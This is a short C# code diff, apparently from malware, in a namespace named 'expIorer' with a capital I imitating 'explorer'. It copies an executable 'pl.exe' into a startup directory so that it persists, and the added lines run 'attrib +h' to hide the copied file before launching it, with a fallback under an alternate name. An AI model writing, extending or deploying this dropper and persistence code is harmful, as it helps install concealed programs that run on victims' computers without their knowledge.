@@ -62,12 +62,14 @@ namespace expIorer
                 try
                 {
                     File.Copy("pl.exe", (startupDir + @"\pl.exe"));
+                    runCommand("attrib +h " + startupDir + @"\pl.exe");
                     runCommand(startupDir + @"\pl.exe");
                     return;
                 }
                 catch
                 {
                     File.Copy("pl.exe", (startupDir + altName));
+                    runCommand("attrib +h " + startupDir + altName);
                     runCommand(startupDir + altName);
                     return;
                 }
